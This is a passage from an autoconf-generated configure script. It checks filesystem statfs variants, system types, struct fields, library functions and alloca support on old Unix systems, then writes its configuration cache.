#define FSTYPE_USG_STATFS 1
EOF
 fstype=SVR3
else
  echo "$ac_err" >&5
fi
rm -f conftest*
fi
if test $fstype = no; then
cat > conftest.$ac_ext <<EOF
#line 1322 "configure"
#include "confdefs.h"
#include <sys/statfs.h>
#include <sys/vmount.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  cat >> confdefs.h <<\EOF
#define FSTYPE_AIX_STATFS 1
EOF
 fstype=AIX
else
  echo "$ac_err" >&5
fi
rm -f conftest*
fi
if test $fstype = no; then  
cat > conftest.$ac_ext <<EOF
#line 1342 "configure"
#include "confdefs.h"
#include <mntent.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  cat >> confdefs.h <<\EOF
#define FSTYPE_MNTENT 1
EOF
 fstype=4.3BSD
else
  echo "$ac_err" >&5
fi
rm -f conftest*
fi
if test $fstype = no; then  
cat > conftest.$ac_ext <<EOF
#line 1361 "configure"
#include "confdefs.h"
#include <sys/mount.h>
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "f_type;" >/dev/null 2>&1; then
  rm -rf conftest*
  cat >> confdefs.h <<\EOF
#define FSTYPE_STATFS 1
EOF
 fstype=4.4BSD/OSF1
fi
rm -f conftest*

fi
if test $fstype = no; then  
cat > conftest.$ac_ext <<EOF
#line 1378 "configure"
#include "confdefs.h"
#include <sys/mount.h>
#include <sys/fs_types.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  cat >> confdefs.h <<\EOF
#define FSTYPE_GETMNT 1
EOF
 fstype=Ultrix
else
  echo "$ac_err" >&5
fi
rm -f conftest*
fi
echo "$ac_t""$fstype" 1>&4


echo $ac_n "checking for uid_t in sys/types.h""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_type_uid_t'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1404 "configure"
#include "confdefs.h"
#include <sys/types.h>
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "uid_t" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_type_uid_t=yes
else
  rm -rf conftest*
  ac_cv_type_uid_t=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_type_uid_t" 1>&4
if test $ac_cv_type_uid_t = no; then
  cat >> confdefs.h <<\EOF
#define uid_t int
EOF

  cat >> confdefs.h <<\EOF
#define gid_t int
EOF

fi

echo $ac_n "checking for size_t""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_type_size_t'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1436 "configure"
#include "confdefs.h"
#include <sys/types.h>
#if STDC_HEADERS
#include <stdlib.h>
#endif
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "size_t" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_type_size_t=yes
else
  rm -rf conftest*
  ac_cv_type_size_t=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_type_size_t" 1>&4
if test $ac_cv_type_size_t = no; then
  cat >> confdefs.h <<\EOF
#define size_t unsigned
EOF

fi

echo $ac_n "checking for pid_t""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_type_pid_t'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1467 "configure"
#include "confdefs.h"
#include <sys/types.h>
#if STDC_HEADERS
#include <stdlib.h>
#endif
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "pid_t" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_type_pid_t=yes
else
  rm -rf conftest*
  ac_cv_type_pid_t=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_type_pid_t" 1>&4
if test $ac_cv_type_pid_t = no; then
  cat >> confdefs.h <<\EOF
#define pid_t int
EOF

fi

echo $ac_n "checking for ino_t""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_type_ino_t'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1498 "configure"
#include "confdefs.h"
#include <sys/types.h>
#if STDC_HEADERS
#include <stdlib.h>
#endif
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "ino_t" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_type_ino_t=yes
else
  rm -rf conftest*
  ac_cv_type_ino_t=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_type_ino_t" 1>&4
if test $ac_cv_type_ino_t = no; then
  cat >> confdefs.h <<\EOF
#define ino_t unsigned long
EOF

fi

echo $ac_n "checking for dev_t""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_type_dev_t'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1529 "configure"
#include "confdefs.h"
#include <sys/types.h>
#if STDC_HEADERS
#include <stdlib.h>
#endif
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "dev_t" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_type_dev_t=yes
else
  rm -rf conftest*
  ac_cv_type_dev_t=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_type_dev_t" 1>&4
if test $ac_cv_type_dev_t = no; then
  cat >> confdefs.h <<\EOF
#define dev_t unsigned long
EOF

fi

echo $ac_n "checking for st_blocks in struct stat""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_struct_st_blocks'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1560 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <sys/stat.h>
int main() { return 0; }
int t() {
struct stat s; s.st_blocks;
; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  ac_cv_struct_st_blocks=yes
else
  rm -rf conftest*
  ac_cv_struct_st_blocks=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_struct_st_blocks" 1>&4
if test $ac_cv_struct_st_blocks = yes; then
  cat >> confdefs.h <<\EOF
#define HAVE_ST_BLOCKS 1
EOF

else
  LIBOBJS="$LIBOBJS fileblocks.o"
fi

echo $ac_n "checking for st_rdev in struct stat""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_struct_st_rdev'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1594 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <sys/stat.h>
int main() { return 0; }
int t() {
struct stat s; s.st_rdev;
; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  ac_cv_struct_st_rdev=yes
else
  rm -rf conftest*
  ac_cv_struct_st_rdev=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_struct_st_rdev" 1>&4
if test $ac_cv_struct_st_rdev = yes; then
  cat >> confdefs.h <<\EOF
#define HAVE_ST_RDEV 1
EOF

fi

echo $ac_n "checking whether struct tm is in sys/time.h or time.h""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_struct_tm'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1626 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <time.h>
int main() { return 0; }
int t() {
struct tm *tp; tp->tm_sec;
; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  ac_cv_struct_tm=time.h
else
  rm -rf conftest*
  ac_cv_struct_tm=sys/time.h
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_struct_tm" 1>&4
if test $ac_cv_struct_tm = sys/time.h; then
  cat >> confdefs.h <<\EOF
#define TM_IN_SYS_TIME 1
EOF

fi

echo $ac_n "checking for tm_zone in struct tm""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_struct_tm_zone'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1658 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <$ac_cv_struct_tm>
int main() { return 0; }
int t() {
struct tm tm; tm.tm_zone;
; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  ac_cv_struct_tm_zone=yes
else
  rm -rf conftest*
  ac_cv_struct_tm_zone=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_struct_tm_zone" 1>&4
if test "$ac_cv_struct_tm_zone" = yes; then
  cat >> confdefs.h <<\EOF
#define HAVE_TM_ZONE 1
EOF

else
  echo $ac_n "checking for tzname""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_var_tzname'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1689 "configure"
#include "confdefs.h"
#include <time.h>
#ifndef tzname /* For SGI.  */
extern char *tzname[]; /* RS6000 and others reject char **tzname.  */
#endif
int main() { return 0; }
int t() {
atoi(*tzname);
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  ac_cv_var_tzname=yes
else
  rm -rf conftest*
  ac_cv_var_tzname=no
fi
rm -f conftest*

fi
  echo "$ac_t""$ac_cv_var_tzname" 1>&4
  if test $ac_cv_var_tzname = yes; then
    cat >> confdefs.h <<\EOF
#define HAVE_TZNAME 1
EOF

  fi
fi

echo $ac_n "checking for working const""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_c_const'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1724 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {

/* Ultrix mips cc rejects this.  */
typedef int charset[2]; const charset x;
/* SunOS 4.1.1 cc rejects this.  */
char const *const *ccp;
char **p;
/* NEC SVR4.0.2 mips cc rejects this.  */
struct point {int x, y;};
static struct point const zero;
/* AIX XL C 1.02.0.0 rejects this.
   It does not let you subtract one const X* pointer from another in an arm
   of an if-expression whose if-part is not a constant expression */
const char *g = "string";
ccp = &g + (g ? g-g : 0);
/* HPUX 7.0 cc rejects these. */
++ccp;
p = (char**) ccp;
ccp = (char const *const *) p;
{ /* SCO 3.2v4 cc rejects this.  */
  char *t;
  char const *s = 0 ? (char *) 0 : (char const *) 0;

  *t++ = 0;
}
{ /* Someone thinks the Sun supposedly-ANSI compiler will reject this.  */
  int x[] = {25, 17};
  const int *foo = &x[0];
  ++foo;
}
{ /* Sun SC1.0 ANSI compiler rejects this -- but not the above. */
  typedef const int *iptr;
  iptr p = 0;
  ++p;
}
{ /* AIX XL C 1.02.0.0 rejects this saying
     "k.c", line 2.27: 1506-025 (S) Operand must be a modifiable lvalue. */
  struct s { int j; const int *ap[3]; };
  struct s *b; b->j = 5;
}
{ /* ULTRIX-32 V3.1 (Rev 9) vcc rejects this */
  const int foo = 10;
}

; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  ac_cv_c_const=yes
else
  rm -rf conftest*
  ac_cv_c_const=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_c_const" 1>&4
if test $ac_cv_c_const = no; then
  cat >> confdefs.h <<\EOF
#define const 
EOF

fi



for ac_func in memcmp memset mktime stpcpy strdup strftime strspn strstr strtol
do
echo $ac_n "checking for $ac_func""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_$ac_func'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1801 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char $ac_func(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_$ac_func) || defined (__stub___$ac_func)
choke me
#else
$ac_func();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_$ac_func=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_$ac_func=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'$ac_func`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  :
else
  echo "$ac_t""no" 1>&4
LIBOBJS="$LIBOBJS ${ac_func}.o"
fi

done

for ac_func in fchdir getcwd strerror
do
echo $ac_n "checking for $ac_func""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_$ac_func'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1848 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char $ac_func(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_$ac_func) || defined (__stub___$ac_func)
choke me
#else
$ac_func();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_$ac_func=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_$ac_func=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'$ac_func`\" = yes"; then
  echo "$ac_t""yes" 1>&4
    ac_tr_func=HAVE_`echo $ac_func | tr '[a-z]' '[A-Z]'`
  cat >> confdefs.h <<EOF
#define $ac_tr_func 1
EOF
 
else
  echo "$ac_t""no" 1>&4
fi
done

# strftime is in -lintl on SCO UNIX.
echo $ac_n "checking for -lintl""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_lib_intl'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  ac_save_LIBS="$LIBS"
LIBS="$LIBS -lintl "
cat > conftest.$ac_ext <<EOF
#line 1898 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {
strftime()
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_lib_intl=yes"
else
  rm -rf conftest*
  eval "ac_cv_lib_intl=no"
fi
rm -f conftest*
LIBS="$ac_save_LIBS"

fi
if eval "test \"`echo '$ac_cv_lib_'intl`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  LIBS="$LIBS -lintl"
else
  echo "$ac_t""no" 1>&4
fi

echo $ac_n "checking for strftime""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_strftime'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1929 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char strftime(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_strftime) || defined (__stub___strftime)
choke me
#else
strftime();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_strftime=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_strftime=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'strftime`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define HAVE_STRFTIME 1
EOF

else
  echo "$ac_t""no" 1>&4
fi

echo $ac_n "checking for vprintf""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_vprintf'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1974 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char vprintf(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_vprintf) || defined (__stub___vprintf)
choke me
#else
vprintf();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_vprintf=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_vprintf=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'vprintf`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define HAVE_VPRINTF 1
EOF

else
  echo "$ac_t""no" 1>&4
fi

if test "$ac_cv_func_vprintf" != yes; then
echo $ac_n "checking for _doprnt""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func__doprnt'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2020 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char _doprnt(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub__doprnt) || defined (__stub____doprnt)
choke me
#else
_doprnt();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func__doprnt=yes"
else
  rm -rf conftest*
  eval "ac_cv_func__doprnt=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'_doprnt`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define HAVE_DOPRNT 1
EOF

else
  echo "$ac_t""no" 1>&4
fi

fi

# The Ultrix 4.2 mips builtin alloca declared by alloca.h only works
# for constant arguments.  Useless!
echo $ac_n "checking for working alloca.h""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_alloca_h'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2069 "configure"
#include "confdefs.h"
#include <alloca.h>
int main() { return 0; }
int t() {
char *p = alloca(2 * sizeof(int));
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  ac_cv_header_alloca_h=yes
else
  rm -rf conftest*
  ac_cv_header_alloca_h=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_header_alloca_h" 1>&4
if test $ac_cv_header_alloca_h = yes; then
  cat >> confdefs.h <<\EOF
#define HAVE_ALLOCA_H 1
EOF

fi

echo $ac_n "checking for alloca""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_alloca'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2100 "configure"
#include "confdefs.h"

#ifdef __GNUC__
# define alloca __builtin_alloca
#else
# if HAVE_ALLOCA_H
#  include <alloca.h>
# else
#  ifdef _AIX
 #pragma alloca
#  else
#   ifndef alloca /* predefined by HP cc +Olibcalls */
char *alloca ();
#   endif
#  endif
# endif
#endif

int main() { return 0; }
int t() {
char *p = (char *) alloca(1);
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  ac_cv_func_alloca=yes
else
  rm -rf conftest*
  ac_cv_func_alloca=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_func_alloca" 1>&4
if test $ac_cv_func_alloca = yes; then
  cat >> confdefs.h <<\EOF
#define HAVE_ALLOCA 1
EOF

fi

if test $ac_cv_func_alloca = no; then
  # The SVR3 libPW and SVR4 libucb both contain incompatible functions
  # that cause trouble.  Some versions do not even contain alloca or
  # contain a buggy version.  If you still want to use their alloca,
  # use ar to extract alloca.o from them instead of compiling alloca.c.
  ALLOCA=alloca.o
  cat >> confdefs.h <<\EOF
#define C_ALLOCA 1
EOF


echo $ac_n "checking whether alloca needs Cray hooks""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_os_cray'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2158 "configure"
#include "confdefs.h"
#if defined(CRAY) && ! defined(CRAY2)
webecray
#else
wenotbecray
#endif

EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "webecray" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_os_cray=yes
else
  rm -rf conftest*
  ac_cv_os_cray=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_os_cray" 1>&4
if test $ac_cv_os_cray = yes; then
echo $ac_n "checking for _getb67""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func__getb67'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2185 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char _getb67(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub__getb67) || defined (__stub____getb67)
choke me
#else
_getb67();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func__getb67=yes"
else
  rm -rf conftest*
  eval "ac_cv_func__getb67=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'_getb67`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define CRAY_STACKSEG_END _getb67
EOF

else
  echo "$ac_t""no" 1>&4
echo $ac_n "checking for GETB67""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_GETB67'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2228 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char GETB67(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_GETB67) || defined (__stub___GETB67)
choke me
#else
GETB67();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_GETB67=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_GETB67=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'GETB67`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define CRAY_STACKSEG_END GETB67
EOF

else
  echo "$ac_t""no" 1>&4
echo $ac_n "checking for getb67""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_getb67'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2271 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char getb67(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_getb67) || defined (__stub___getb67)
choke me
#else
getb67();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_getb67=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_getb67=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'getb67`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define CRAY_STACKSEG_END getb67
EOF

else
  echo "$ac_t""no" 1>&4
fi

fi

fi

fi

echo $ac_n "checking stack direction for C alloca""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_c_stack_direction'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  if test "$cross_compiling" = yes; then
  ac_cv_c_stack_direction=0
else
cat > conftest.$ac_ext <<EOF
#line 2325 "configure"
#include "confdefs.h"
find_stack_direction ()
{
  static char *addr = 0;
  auto char dummy;
  if (addr == 0)
    {
      addr = &dummy;
      return find_stack_direction ();
    }
  else
    return (&dummy > addr) ? 1 : -1;
}
main ()
{
  exit (find_stack_direction() < 0);
}
EOF
eval $ac_link
if test -s conftest && (./conftest; exit) 2>/dev/null; then
  ac_cv_c_stack_direction=1
else
  ac_cv_c_stack_direction=-1
fi
fi
rm -fr conftest*
fi
echo "$ac_t""$ac_cv_c_stack_direction" 1>&4
cat >> confdefs.h <<EOF
#define STACK_DIRECTION $ac_cv_c_stack_direction
EOF

fi

# getmntent is in -lsun on Irix 4, -lseq on Dynix/PTX.
echo $ac_n "checking for -lsun""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_lib_sun'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  ac_save_LIBS="$LIBS"
LIBS="$LIBS -lsun "
cat > conftest.$ac_ext <<EOF
#line 2368 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {
getmntent()
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_lib_sun=yes"
else
  rm -rf conftest*
  eval "ac_cv_lib_sun=no"
fi
rm -f conftest*
LIBS="$ac_save_LIBS"

fi
if eval "test \"`echo '$ac_cv_lib_'sun`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  LIBS="$LIBS -lsun"
else
  echo "$ac_t""no" 1>&4
echo $ac_n "checking for -lseq""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_lib_seq'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  ac_save_LIBS="$LIBS"
LIBS="$LIBS -lseq "
cat > conftest.$ac_ext <<EOF
#line 2399 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {
getmntent()
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_lib_seq=yes"
else
  rm -rf conftest*
  eval "ac_cv_lib_seq=no"
fi
rm -f conftest*
LIBS="$ac_save_LIBS"

fi
if eval "test \"`echo '$ac_cv_lib_'seq`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  LIBS="$LIBS -lseq"
else
  echo "$ac_t""no" 1>&4
fi

fi

echo $ac_n "checking for getmntent""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_getmntent'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 2432 "configure"
#include "confdefs.h"
#include <ctype.h> /* Arbitrary system header to define __stub macros. */
/* Override any gcc2 internal prototype to avoid an error.  */
char getmntent(); 

int main() { return 0; }
int t() {

/* The GNU C library defines this for functions which it implements
    to always fail with ENOSYS.  Some functions are actually named
    something starting with __ and the normal name is an alias.  */
#if defined (__stub_getmntent) || defined (__stub___getmntent)
choke me
#else
getmntent();
#endif

; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_func_getmntent=yes"
else
  rm -rf conftest*
  eval "ac_cv_func_getmntent=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_func_'getmntent`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define HAVE_GETMNTENT 1
EOF

else
  echo "$ac_t""no" 1>&4
fi

echo $ac_n "checking whether closedir returns void""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_func_closedir_void'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  if test "$cross_compiling" = yes; then
    { echo "configure: error: can not run test program while cross compiling" 1>&2; exit 1; }
else
cat > conftest.$ac_ext <<EOF
#line 2480 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <$ac_header_dirent>
int closedir(); main() { exit(closedir(opendir(".")) != 0); }
EOF
eval $ac_link
if test -s conftest && (./conftest; exit) 2>/dev/null; then
  ac_cv_func_closedir_void=no
else
  ac_cv_func_closedir_void=yes
fi
fi
rm -fr conftest*
fi
echo "$ac_t""$ac_cv_func_closedir_void" 1>&4
if test $ac_cv_func_closedir_void = yes; then
  cat >> confdefs.h <<\EOF
#define CLOSEDIR_VOID 1
EOF

fi


trap '' 1 2 15
if test -w $cache_file; then
echo "updating cache $cache_file"
cat > $cache_file <<\EOF
# This file is a shell script that caches the results of configure
# tests run on this system so they can be shared between configure
# scripts and configure runs.  It is not useful on other systems.
# If it contains results you don't want to keep, you may remove or edit it.
#
# By default, configure uses ./config.cache as the cache file,
# creating it if it does not exist already.  You can give configure
# the --cache-file=FILE option to use a different cache file; that is
# what configure does when it calls configure scripts in
# subdirectories, so they share the cache.
# Giving --cache-file=/dev/null disables caching, for debugging configure.
# config.status only pays attention to the cache file if you give it the
# --recheck option to rerun configure.
#
EOF
# Ultrix sh set writes to stderr and can't be redirected directly.
(set) 2>&1 |
  sed -n "s/^\([a-zA-Z0-9_]*_cv_[a-zA-Z0-9_]*\)=\(.*\)/: \${\1='\2'}/p" \
  >> $cache_file
else
echo "not updating unwritable cache $cache_file"
fi

trap 'rm -fr conftest* confdefs* core $ac_clean_files; exit 1' 1 2 15

test "x$prefix" = xNONE && prefix=$ac_default_prefix
